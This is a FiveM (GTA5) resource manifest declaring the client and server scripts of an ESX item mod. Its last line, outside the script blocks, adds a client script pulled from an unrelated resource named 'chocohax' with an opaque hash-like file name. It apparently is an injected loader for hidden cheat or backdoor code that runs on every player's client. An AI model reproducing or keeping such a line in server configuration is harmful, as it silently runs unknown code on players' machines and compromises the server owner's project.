fx_version 'adamant'

game 'gta5'

description 'Eric Spectial Items'

Author 'Ai Rei Ke'

version '1.0.0'

client_scripts {
	'@es_extended/locale.lua',
	'locales/tw.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	"@mysql-async/lib/MySQL.lua",
	'@es_extended/locale.lua',
	'locales/tw.lua',
	'config.lua',
	'server/main.lua'
}
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'